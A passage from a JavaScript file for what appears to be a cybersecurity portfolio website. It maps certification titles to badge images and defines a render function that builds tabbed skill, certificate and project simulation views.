          'HTB Certified Defensive Security Analyst (CDSA)':    'assets/certificates/HTB-CDSA.png',
      'CompTIA Network+ (N10-009)':     'assets/certificates/Network+.png',
      'CompTIA Security+ (SY0-701)':    'assets/certificates/Security+.png',
      'Cyber Security 101':     'assets/certificates/Cyber-Security-101.png',
      'Jr Penetration Tester':  'assets/certificates/Jr-PenTester.png',
      'SOC Level 1':    'assets/certificates/SOC-L1.png',
      'SOC Level 2':    'assets/certificates/SOC-L2.png',
      'Google Cybersecurity Professional Certificate':  'assets/certificates/Google-Cybersecurity.png',
      'ISTQB Certified Tester Foundation Level (CTFL)': 'assets/certificates/CTFL.png',
      'ISTQB Certified Tester Foundation Level — Agile Tester (CTFL-AT)':       'assets/certificates/CTFL-AT.png'
    };
    return byName[cert.title] || 'assets/certificates/Google-Logo.png';
  }

  /* =================================================================
   *  PUBLIC API
   * ================================================================= */
  window.SIMULATIONS = {
    render: function (key, host, ctx) {
      // cleanup previous
      if (host.__cleanup) { host.__cleanup(); host.__cleanup = null; }
      ctx = ctx || {};
      ctx.tabs = ctx.tabs || [];

      // 1. CERT VIEW — clicking a certification card
      if (key === '__cert_view__' && ctx.cert) {
        certViewSim(ctx.cert, host);
        return;
      }

      // 2. SKILL SIM — always produce 3 tabs (sources / radar / live-sim)
      if (ctx.skill) {
        const skill = ctx.skill;
        const liveRenderer = (typeof key === 'string' && SKILL_SIMS[key]) ? SKILL_SIMS[key] : genericLiveSim;

        // push 3 tabs
        ctx.tabs.push(
          { id: 'sources',  label: '// SOURCES' },
          { id: 'radar',    label: '// PROFICIENCY' },
          { id: 'live-sim', label: '// LIVE SIMULATION' }
        );

        // build 3 sections; live-sim section will be filled by the renderer
        host.innerHTML = `
          <div class="sim-section active" data-sim="sources">
            ${renderSourcesSection(skill)}
          </div>
          <div class="sim-section" data-sim="radar">
            ${renderRadarSection(skill)}
          </div>
          <div class="sim-section" data-sim="live-sim">
            <!-- live sim renderer fills this in -->
          </div>
        `;

        const liveHost = host.querySelector('[data-sim="live-sim"]');
        if (liveHost) {
          // Specific skill sims take only (host); genericLiveSim takes (skill, host)
          if (liveRenderer === genericLiveSim) {
            genericLiveSim(skill, liveHost);
          } else {
            liveRenderer(liveHost);
          }
        }
        return;
      }

      // 3. EXPERIENCE / PROJECT simulations
      if (SIMS[key]) {
        SIMS[key](host, ctx);
        return;
      }

      host.innerHTML = `<div class="sim-p">Simulation not configured for this entry. Add a renderer in <span class="code-inline">simulations.js</span> for key <span class="code-inline">${key}</span>.</div>`;
    }
  };

})();
